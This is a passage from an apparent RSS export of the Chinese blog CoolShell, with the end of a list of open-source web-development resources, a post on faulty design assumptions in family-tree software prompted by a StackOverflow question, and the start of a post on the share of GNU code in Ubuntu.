<h4>
<span class="ez-toc-section" id="JavaScript_%E5%9B%BE%E5%BD%A2_%E5%92%8C_3D"></span>JavaScript 图形 和 3D<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="http://processingjs.org/" target="_blank"><strong>Processing.js</strong></a>是一个开放的编程语言，在不使用Flash或Java小程序的前提下, 可以实现程序图像、动画和互动的应用。其使用Web标准，无需任何插件。</li>
<li>★ Javascript 3D 引擎: <a href="https://github.com/mrdoob/three.js" target="_blank"><strong>ThreeJS</strong></a> 由 Mr Doob 开发，一个轻量级的 3D 引擎，不需要了解细节，傻瓜都能使用。这个引擎可以使用&lt;canvas&gt;, &lt;svg&gt; 和 WebGL.</li>
<li>
<a href="http://www.iquilezles.org/apps/shadertoy/" target="_blank"><strong>Shader Toy</strong></a>, 一款使用WebGL的在线着色器编辑器(2D/3D). 基于在线的应用架构使您无需下载任何软件即可开始体验. Shader Toy包含大量实用着色器, 诸如光线追踪, 场景距离渲染, 球体, 隧道, 变形, 后期处理特效等.</li>
<li>
<a href="https://senchalabs.github.com/philogl/" target="_blank"><strong>PhiloGL</strong></a>, Sencha的PhiloGL是首个WebGL开发工具之一，提供了高水准的功能，来构建WebGL应用。Sencha创建了几个演示，来描述框架交互式3D虚拟化的能力，比如<a href="https://senchalabs.github.com/philogl/PhiloGL/examples/temperatureAnomalies/">3D view of global temperature changes</a>。</li>
<li>
<a href="https://benvanik.github.com/WebGL-Inspector/" target="_blank"><strong>WebGL Inspector</strong></a> 你就Firebug等Web调试工具一样，这个是 WebGL的调试工具。</li>
<li>
<a href="https://www.khronos.org/webgl/wiki_1_15/" target="_blank"><strong>WebGL frameworks</strong></a> 由 Khronos Group 收集的一个WebGL框架列表。</li>
<li>
<a href="http://easeljs.com/" target="_blank"><strong>EaselJS</strong></a>, 一个使用html5的canvas的 JavaScript 库. <a href="https://github.com/gskinner/EaselJS" target="_blank">Sources</a>.</li>
<li>
<a href="http://www.webresourcesdepot.com/free-javascript-game-frameworks-to-create-a-web-based-fun/" target="_blank"><strong>JavaScript Game Frameworks</strong></a> 免费的JS游戏框架列表。另，可参看 <a title="JS游戏引擎列表" href="https://coolshell.cn/articles/3516.html" target="_blank">JS游戏框架列表</a>。</li>
<li>
<a href="http://raphaeljs.com/" target="_blank"><strong>Raphaël</strong></a>是一个小型的JavaScript 库，用来简化在页面上显示向量图的工作。你可以用它在页面上绘制各种图表、并进行图片的剪切、旋转等操作。参看<a title="Javascript向量图Lib–Raphaël" href="https://coolshell.cn/articles/3107.html" target="_blank">Javascript向量图Lib–Raphaël</a>
</li>
<li>
<a href="http://keith-wood.name/svgRef.html" target="_blank"><strong>jQuery SVG</strong></a> 插件让你可以了 SVG canvas 进行交互。</li>
<li>
<a href="https://code.google.com/intl/fr/apis/chart/" target="_blank"><strong>Google chart tools</strong></a> –  参看本站的<a href="https://coolshell.cn/articles/582.html" target="_blank">使用Google API做统计图</a>
</li>
<li>
<a href="https://coolshell.cn/articles/582.html" target="_blank"></a><a href="http://arborjs.org/" target="_blank"><strong>Arbor.js</strong></a>, 是一个利用webworkers和jQuery创建的数据图形可视化JavaScript框架。它为图形组织和屏幕刷新处理提供了一个高效、力导向布局算法。</li>
</ul>
<h4>
<span class="ez-toc-section" id="JavaScript_%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A5%E5%8F%A3_HTML5"></span>JavaScript 浏览器接口 (HTML5)<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="http://www.modernizr.com/" target="_blank"><strong>Modernizr</strong></a> – 是一个专为HTML5 和CSS3 开发的功能检测类库，可以根据浏览器对HTML5 和CSS3 的支持程度提供更加便捷的前端优化方案.<a href="https://github.com/Modernizr/Modernizr" target="_blank">Sources</a>. 一个有用的列表 <a href="https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-browser-Polyfills" target="_blank">cross-browser Polyfills</a>
</li>
<li>
<a href="https://code.google.com/p/html5shiv/" target="_blank"><strong>HTML5Shiv</strong></a> : 该项目的目的是为了让IE 能识别HTML5 的元素。</li>
<li>
<a href="https://github.com/remy/polyfills" target="_blank"><strong>Polyfills</strong></a> : 这个项目收集了一些代码片段其用Javascript支持不同的浏览器的特别功能，有些代码需要Flash。</li>
<li>
<a href="http://yepnopejs.com/" target="_blank"><strong>YepNopeJS</strong></a> : 一个异步的条件式的加载器。<a href="https://github.com/SlexAxton/yepnope.js" target="_blank">Sources</a>.</li>
<li>jQuery <a href="https://github.com/codler/jQuery-Css3-Finalize/" target="_blank"><strong>CSS3 Finalise</strong></a> : 是否厌倦了为每一个浏览器的CSS3属性加前缀？</li>
<li>★ <a href="http://amplifyjs.com/" target="_blank"><strong>Amplify.js</strong></a> :一套用于web应用数据管理和应用程序通讯的<strong> jQuery 组件库</strong>。提供简单易用的API接口。Amplify的目标是通过为各种数据源提供一个统一的程序接口简化各种格式数据的数据处理。Amplify的存储组件使用localStorage 和 sessionStorage标准处理客户端的存储信息，对一些老的浏览器支持可能有问题。Amplify’为jQuery的ajax方法request增加了一些额外的特性。 <a href="https://github.com/appendto/amplify" target="_blank">Sources</a>.</li>
<li>
<a href="https://github.com/balupton/history.js" target="_blank"><strong>History.js</strong></a> 优美地支持了HTML5 History/State APIs</li>
<li>
<a href="http://socket.io/" target="_blank"><strong>Socket.IO</strong></a> Web的socket编程。</li>
</ul>
<h4>
<span class="ez-toc-section" id="JavaScript_%E5%B7%A5%E5%85%B7"></span>JavaScript 工具<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★  {{<a href="https://mustache.github.com/" target="_blank"><strong>mustaches</strong></a>}} 小型的 JavaScript 模板引擎。</li>
<li>
<a href="http://jsonselect.org/" target="_blank"><strong>json:select()</strong></a>, CSS式的JSON选择器</li>
<li>
<a href="http://headjs.com/" target="_blank"><strong>HeadJS</strong></a>, 异步JavaScript装载。其最大特点就是不仅可以按顺序执行还可以并发装载载js。</li>
<li>
<a href="https://code.google.com/p/jsdoc-toolkit/" target="_blank"><strong>JsDoc Toolkit</strong></a>是一款辅助工具，你只需要根据约定在JavaScript 代码中添加相应的注释，它就可以根据这些注释来自动生成API文档。</li>
<li>
<a href="https://github.com/filamentgroup/Responsive-Images" target="_blank"><strong>Responsive image</strong></a>, 一个试验性的项目，用来处理<a href="http://www.alistapart.com/articles/responsive-web-design/">responsive layouts</a> 式的图片。</li>
<li>
<a href="http://marijnhaverbeke.nl/uglifyjs" target="_blank"><strong>UglifyJS</strong></a>是基于NodeJS的Javascript语法解析/压缩/格式化工具，它支持任何CommonJS模块系统的Javascript平台。</li>
<li>
<a href="http://www.dhteumeuleu.com/" target="_blank"><strong>Dhteumeuleu</strong></a>, 交互式的 DOM 脚本和DHTML 的开源演示。</li>
<li>
<a href="https://github.com/documentcloud/backbone/" target="_blank"><strong>Backbone</strong></a>是一个前端 JS 代码 MVC 框架，被著名的 37signals 用来构建他们的移动客户端。它不可取代 Jquery，不可取代现有的Template 库。而是和这些结合起来构建复杂的 web 前端交互应用。如果项目涉及大量的 javascript 代码，实现很多复杂的前端交互功能，首先你会想到把数据和展示分离。使用 Jquery 的 selector 和 callback 可以轻松做到这点。但是对于富客户端的WEB应用大量代码的结构化组织非常必要。Backbone 就提供了 javascript 代码的组织的功能。Backbone 主要包括 models, collections, views 和 events, controller 。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%92%8C%E6%A8%A1%E6%8B%9F%E5%99%A8"></span>客户端和模拟器<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>
<a href="http://browsershots.org/" target="_blank"><strong>BrowserShot</strong></a>, 检查浏览器的兼容性，跨浏览器平器的测试</li>
<li>
<strong><a href="http://tester.jonasjohn.de/" target="_blank">Test everything</a></strong>… 输入一个你想要测试的URL……</li>
<li>
<a href="http://tmobile.modeaondemand.com/htc/g1/" target="_blank"><strong>Android browser</strong></a> 模拟器</li>
<li>
<a href="http://iphonetester.com/" target="_blank"><strong>iPhone browser</strong></a> 模拟器</li>
<li>
<a href="https://www.opera.com/mobile/demo/" target="_blank"><strong>Opera browser</strong></a> 模拟器</li>
<li>★ <a href="https://getfirebug.com/whatisfirebug" target="_blank"><strong>Firebug</strong></a> 与 <strong><a href="https://www.mozilla.com/fr/firefox/" target="_blank">Firefox</a></strong> 集成，可以查看和调试你的Web页面。</li>
</ul>
<h3>CSS3 和 字库</h3>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="http://www.css3maker.com/" target="_blank"><strong>CSS3 Maker</strong></a> CCS3的生成器</li>
<li>容易地创建 <strong><a href="http://www.sencha.com/products/animator/" target="_blank">CSS3 animations</a>。</strong> Sencha Animator 是一个桌面应用可以为WebKit浏览器和触摸式移动设备创建 CSS3 animations 。</li>
<li>
<a href="http://csswarp.eleqtriq.com/" target="_blank"><strong>CSSwarp</strong></a> – CSS 文本扭曲生成器</li>
<li>
<a href="http://www.colorzilla.com/gradient-editor/" target="_blank"><strong>Gradient Editor</strong></a>, 一个强大的Photoshop式的CSS 渐变编译器。来自 ColorZilla</li>
<li>★ <a href="https://www.google.com/webfonts" target="_blank"><strong>Google Web Fonts</strong></a> 通过Google Web Fonts API 可以浏览所有的字体</li>
<li>
<a href="http://www.fontsquirrel.com/fontface/generator" target="_blank"><strong>@font-face Kit Generator</strong></a>, 为Web转换字体</li>
<li>
<a href="http://www.typetester.org/" target="_blank"><strong>Typetester</strong></a>, 比较字体。</li>
<li>
<a href="http://mediaqueri.es/" target="_blank"><strong>Media Queries</strong></a>. 一组 responsive web 设计。</li>
<li>
<a href="http://patterntap.com/" target="_blank"><strong>Pattern TAP</strong></a>, UI组件。</li>
</ul>
<h4>
<span class="ez-toc-section" id="Website_FULL_%E6%A8%A1%E6%9D%BF"></span>Website (FULL) 模板<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="http://html5boilerplate.com/" target="_blank"><strong>HTML5 Boilerplate</strong></a> 是一个<a href="http://www.mhtml5.com/">HTML5 </a>/ CSS / js模板，是实现跨浏览器正常化、性能优化，稳定的可选功能如跨域Ajax和Flash的最佳实践。 项目的开发商称之为技巧集合，目的是满足您开发一个跨浏览器，并且面向未来的网站的需求。 <a href="https://github.com/paulirish/html5-boilerplate" target="_blank">Sources</a>.</li>
<li>
<a href="http://sickdesigner.com/resources/HTML5-starter-pack/" target="_blank"><strong>HTML5 starter pack</strong></a> 是一个干净的和有组织的目录结构，其可适合很多项目，还有一些很常用的文件，以及简单的Photoshop设计模板。</li>
<li>★ <a href="http://initializr.com/" target="_blank"><strong>Initializr</strong></a> 是一个HTML5 模板生成器，其可以帮你在15秒内创建一个HTML5的项目。</li>
<li>
<a href="http://tympanus.net/Tutorials/AnimatedPortfolioGallery/" target="_blank"><strong>Animated Portfolio Gallery</strong></a> （<a href="http://tympanus.net/codrops/2010/11/14/animated-portfolio-gallery/" target="_blank">教程</a>）</li>
<li> <a href="http://tutorialzine.com/2010/07/making-slick-mobileapp-website-jquery-css/" target="_blank"><strong>Slick MobileApp Website</strong></a> 如果通过 jQuery 和 CSS 制作一个手机应用的网站。</li>
<li> <a href="http://net.tutsplus.com/tutorials/javascript-ajax/how-to-build-an-rss-reader-with-jquery-mobile-2/" target="_blank"><strong>RSS Reader</strong></a> 如果通过 jQuery Mobile 创建一个RSS Reader</li>
<li>★ <a href="http://addyosmani.com/blog/building-spas-jquerys-best-friends/" target="_blank"><strong>Single Page Applications</strong></a> 使用jQuery的朋友们 (Backbone, Underscore, …)创建单一页面。</li>
<li>
<a href="https://code.google.com/p/gtv-resources/" target="_blank"><strong>Google TV Optimized Templates</strong></a>, 传统电视已经开始和网路融合，但现阶段产业仍然正在摸索之中，为此将来的网页亦会有结构上的改变。<a href="https://code.google.com/p/gtv-resources/">Google TV Optimized Templates</a>是一个用HTML/JavaScript制成的开源软体，一如其名是一个对Google TV作出了最佳化的的网页范本，其特色是以遥控器作为操作的前提，令使用者无需输入任何文字就可以进行控制。未来除了会有专用遥控器外，还会采用智能手机透过W-iFi控制Google TV的方法。Optimized Templates的界面中左方会展示分类，右方会显示该分类下的影片截图，影片播放、切换、全画面表示都可透过键盘上的方向键、Backspace或Enter等键完成，方便今后的网站开发人员借镜。HTML5 版的模板使用了 <a href="https://code.google.com/p/gtv-ui-lib" target="_blank">Google TV UI library</a>, jQuery  和 Closure 。</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3903.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_title">一些有意思的贴子和工具</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_title">Web中的省略号</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4795" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="80a15753aa">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>33</strong> 人打了分，平均分： <strong>4.52</strong> )<br><span class="post-ratings-text" id="ratings_4795_text"></span><meta itemprop="name" content="开源中最好的Web开发的资源">
<meta itemprop="headline" content="开源中最好的Web开发的资源">
<meta itemprop="description" content="文章来源：Best “must know” open sources to build the new Web。个人感觉这个收集贴收集成相当的全。
学习HTML 5编程和设计


	★ HTML5 Rocks : Major Feature Groups  的学习 HTML5 的资源 (HTML5 演示, 教程 ). 源码
	很不错的 HTML5 Dashboard - Mozilla，...">
<meta itemprop="datePublished" content="2011-06-08T08:28:52+08:00">
<meta itemprop="dateModified" content="2011-06-06T13:19:54+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4795.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4795.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.52">
<meta itemprop="ratingCount" content="33">
</div>
</div>
<div id="post-ratings-4795-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-08T08:28:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/4795.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 软件真的好难做啊 ]]></title>
<link>https://coolshell.cn/articles/4811.html</link>
<content><![CDATA[ 
<p>还记得以前本站的那一篇“<a title="编程真难啊" href="https://coolshell.cn/articles/1391.html" target="_blank">编程好难啊</a>”吗，那是一篇众程序员调侃程序新手的文章，有恶搞的成分在里面。今天要和大家说的这个事没有一些恶搞和调侃的意思，是比较严肃的话题，你一定可以从中收获一些东西。这个话题来自StackOverflow上的一个问题——<a title="Cycle in family tree software" href="https://stackoverflow.com/questions/6163683/cycles-in-family-tree-software" target="_blank">Cycle in Family Tree Software</a>，这个程序员问了下面这个问题：</p>
<blockquote>
<p>我是一个写家族族谱软件的程序员（我用的是C++和Qt），这个软件基本上没有什么问题，直到有一天有个用户报告了一个bug。这个问题是这样的——<strong>我这个用户和他女儿生了两个孩子</strong>。</p>
<p>于是，我程序员的一些断言和硬性条件导致程序报错，因为我的程序在处理这个关系的时候，其发现X即是Y的爸爸，又是Y的爷爷，所以只能报错。</p>
<p>请问，<strong>在不需要移除我的断言和数据验证的情况下，</strong><strong>我怎么才能解决这个问题</strong>？</p>
</blockquote>
<p>看到这里，请重点阅读一下下面的两点：</p>
<ul>
<li>如果你看到这里开始兴奋了，请你为你阴暗的心理去面壁反省10分钟，因为这是一个很技术的问题。</li>
<li>如果你开始陷入了深深的思考如何解决这个问题，那么你绝对是一个合格的程序员，因为你已陷入技术已经很深了，有点呆了。</li>
</ul>
<p>我在前面说过，“<strong>这个是一个严肃的话题，你可以从中收获一些东西</strong>”，当然，我并不希望你来收获乱伦的知识和心得，酷壳是一个技术博客，应该是收获技术方面的东西。</p>
<p><span id="more-4811"></span></p>
<p>从技术的角度上来说，这是我们经常在设计软件时犯的错误——</p>
<h4>
<strong>1）作了错误的假设</strong>（Assumption）</h4>
<p>Assumption是软件设计的重大天敌，Assumption的动词Assume意为Ass u me – Ass you and me 。你的假设做得越多，你的设计就越不靠谱。这里的假设是——我们以为family tree是一个tree，其实并不是tree。<strong>Assumption是魔鬼</strong>。</p>
<p>还有一些经典的Assumption如下所示</p>
<ul>
<li>最著名的就是那个y2k臭虫。</li>
<li>不要以为没有2月30日，在瑞典1712年有2月30日</li>
<li>一分钟有60秒？闰秒呢？</li>
<li>双胞胎的生日是同一天吗？</li>
<li>双胞胎的父亲是同一个？</li>
<li>性别只有男和女？</li>
<li>婚姻只能是异性？ 关于这一点，推荐一篇强文——<a href="https://qntm.org/gay" target="_blank">Gay marriage: the database engineering perspective</a> (同性婚姻：数据库工程)</li>
</ul>
<h4>
<strong>2）没有认真分析用户案例</strong>（Use Case）</h4>
<p>在设计软件时，我们需要考虑各种各样的用户案例，比如如下的东西：</p>
<ul>
<li>私生子的问题</li>
<li>一夫多妻或一妻多夫，同父异母，同母异父</li>
<li>就算一夫多妻制违反法律，也会有离异再婚的情况</li>
<li>同性恋的问题，虽然不能繁衍，但可以领养。</li>
<li>换妻活动</li>
<li>各种乱伦关系——这种东西那个民族都不少，尤其是古时候，比如：
<ul>
<li>先后嫁了两个人其是父子关系（昭君）</li>
<li>达尔文同学和他的表妹，爱因斯坦的二婚是和他的表姐，埃及艳后嫁了她的弟弟，……</li>
<li>顺治同学娶了四个老婆，这四个人还是一家人：姑姑，侄女，妹妹，女儿。（<a href="http://blog.sina.com.cn/s/blog_5e62ac110100onwa.html" target="_blank">参看这里</a>）</li>
<li>刘邦同学的母后干出来的事，相当变态（<a href="http://bbs.tiexue.net/post2_5114346_1.html" target="_blank">参看这里</a>）</li>
<li>中国古代的“扒灰老” （类似于楼主那个问题的Use Case）</li>
</ul>
</li>
</ul>
<p><strong>不想再列下去了，人类真TMD恶心，有点要吐了</strong>。</p>
<p style="text-align: center;">——————————为了缓解一下恶心的气氛，请允许我插入一个搞笑短文——————————</p>
<blockquote><p>一位自杀者在他的遗书里讲述了他自杀的原因，听起来实在让人头痛。遗书这样写道：“我和一个寡妇结了婚，她有一个已成年的女儿，我父亲跟我妻子带过来的女儿结了婚。所以我父亲就成了我的女婿，女儿就成了我的后母，我管父亲叫爸爸，而我父亲也管我叫爸爸；我女儿管我叫爸爸，但我却管她叫妈妈；我还得管我妻子叫姥姥，因为她是我后母的母亲。不久我女儿，也就是我后母生了一个儿子，他是我同父异母的弟弟，他也得管我叫姥爷，因为他也是我的外孙。后来我妻子，也就是我姥姥生了一个儿子，他是我后母的弟弟，我是他的外甥，所以儿子管我叫爸爸，我管儿子叫舅舅。另外我是我妻子，也就是我姥姥的外孙，同时也是我姥姥的丈夫，所已我也是我的外祖父。又因为我妻子是我的外祖母，我的儿子，也就是我的舅舅是我的弟弟和我女儿的弟弟，所以我……我的天哪，这么复杂的关系实在让我伤透了脑筋，我只有一死才能得以解脱……”</p></blockquote>
<p style="text-align: center;">————————————————————————插入完毕————————————————————</p>
<p style="text-align: left;">看完上面这个短文，不知道你是否和我一样，觉得这么一个简单的程序将是如此难做啊。<strong>另外，我决定在下一次的面试中让应聘者来设计Family Tree的程序</strong>。</p>
<p style="text-align: left;">我又说多了，现在还是让我们回到技术上来。除了上面那几个观点，我在回复中还看到了如入一些有意思的回复：</p>
<ul>
<li>“我的软件没有bug，是你的生活有bug”——让我想到了<a title="程序员惯用的解释(Top 25)" href="https://coolshell.cn/articles/1174.html" target="_blank">程序员惯用的借口</a>
</li>
<li>“算法中不应该加太多的限制，限制多了反而让算法不灵活。”</li>
<li>“移除断言，并不代表就不出错，对于这种rare case，我们最好给一个Warning提醒用户，让用户确认确实是这样的。”</li>
<li>“关于解决这个问题，移除那个断言，如果显示上会有问题的话，那就复制一下有不同关系的人就可以了”</li>
<li>“你真的应该想想你的软件的价值是什么？市场在哪里？你真的要照顾这样的用户吗？”</li>
</ul>
<p>挺好的，相信你对软件开发又学到了一些东西。</p>
<p><span style="color: #cc0000;"><strong>（转载时请勿用于商业目的，并请注明作者和出处）</strong></span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17680.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_title">从Gitlab误删除数据库想到的</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17459.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_title">关于高可用的系统</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6775.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_title">Bret Victor – Inventing on Principle</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5686.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5686.html" class="wp_rp_title">多些时间能少写些代码</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4811" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="39275b3e58">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>28</strong> 人打了分，平均分： <strong>4.50</strong> )<br><span class="post-ratings-text" id="ratings_4811_text"></span><meta itemprop="name" content="软件真的好难做啊">
<meta itemprop="headline" content="软件真的好难做啊">
<meta itemprop="description" content="还记得以前本站的那一篇“编程好难啊”吗，那是一篇众程序员调侃程序新手的文章，有恶搞的成分在里面。今天要和大家说的这个事没有一些恶搞和调侃的意思，是比较严肃的话题，你一定可以从中收获一些东西。这个话题来自StackOverflow上的一个问题——Cycle in Family Tree Software，这个程序员问了下面这个问题：
我是一个写家族族谱软件的程序员（我用的是C++和Qt），这个软件...">
<meta itemprop="datePublished" content="2011-06-10T08:45:17+08:00">
<meta itemprop="dateModified" content="2011-11-01T14:21:50+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4811.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4811.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.5">
<meta itemprop="ratingCount" content="28">
</div>
</div>
<div id="post-ratings-4811-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-10T08:45:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/4811.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ GNU/Linux下有多少是GNU的？ ]]></title>
<link>https://coolshell.cn/articles/4826.html</link>
<content><![CDATA[ 
<p>一个葡萄牙的学生写了一篇文章 《<a href="http://pedrocr.net/text/how-much-gnu-in-gnu-linux" target="_blank">How much GNU is there in GNU/Linux?</a>》 – GNU/Linux下有多少是GNU的。他的这篇文章主要分布了今年4月份的Ubuntu Natty的Linux分发包。其主要是用代码行来做的分析，其给了两个饼图。</p>
<p>第一个饼图如下，其指明了各种主流的开源项目组的分布情况。可见GNU只占了8%，当然，GNome也是GNU的，加起来也只有13%，只占整个分发包很少的比重。</p>
<p><img alt="image placeholder" ></p>
<p>第二个图，作者把GNU的部分拿了出来，再进行了分析：</p>
<p><span id="more-4826"></span></p>
<p>在下面这个图中，我们可以看到主要是四大块——gcc, gdb, binutils 和 glibc，所以，作者说，这些东西都不是最终用户需要的，不是每一个用户都是需要搞开发的。所以，如果去除这些，再去除Gnome（这个桌面UI也不是很力），那么GNU的东西几乎没有了。</p>
<p><img alt="image placeholder" ></p>
<p>所以，作者以此来挑战Richard Stallman提到的 GNU/Linux的这个说法。好像更为好的说法应该叫——</p>
<p style="text-align: center;"><strong>GNU/KDE/java/xorg/Linux</strong></p>
<p>我对这篇文章有下述一些感觉：</p>
<ul>
<li>以代码行来衡量重要性，非常的不准确。比尔盖茨说过——“用代码行数来衡量编程的进度，就如同用航空器零件的重量来衡量航空飞机的制造进度一样”（参看《<a title="最佳编程语录" href="https://coolshell.cn/articles/2753.html" target="_blank">最佳编程语录</a>》），所以，用这个数据来并不一定正确。如果用Linux的各种包的依赖性可能会更好一点。</li>
<li>至少我知道，离开了glibc，可能整个操作系统都会不举。Linux下，绝大多数软件都是gcc/gdb编程和调试出来的（当然，LLVM和Clang正在挑战着gcc编译器），而且大多数软件都在用着GPL的许可证（<a title="狗日的开源软件许可证" href="https://coolshell.cn/articles/4657.html" target="_blank">虽然开源世界的许可证是如此的混乱</a>）</li>
<li>辩证地，我们不能否定GNU的历史价值，同时我们似乎也在看到GNU好像有点萎靡。</li>
</ul>
<p>老实说，其实叫什么不重要，是GNU/Linux也好，是Ubuntu 也好，还是Android也好，无所谓。Linux的各种分发包中都存在着全世界黑客文化的和开源文化的结晶，每当我看到这样的分布图时（例如：<a title="谁写了Linux" href="https://coolshell.cn/articles/1360.html" target="_blank">是谁写的Linux?</a>），我心中都有一种说不出来的豪情，这难道不真是一种壮举吗？（<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix黑客文化的真正延伸</a>）。</p>
<p>不管这种方式的软件有没有市场，能不能得到“最终用户”的认可，但这已成为了软件开发的一种精神——那种不分彼此，相互协作的精神，不是吗？</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
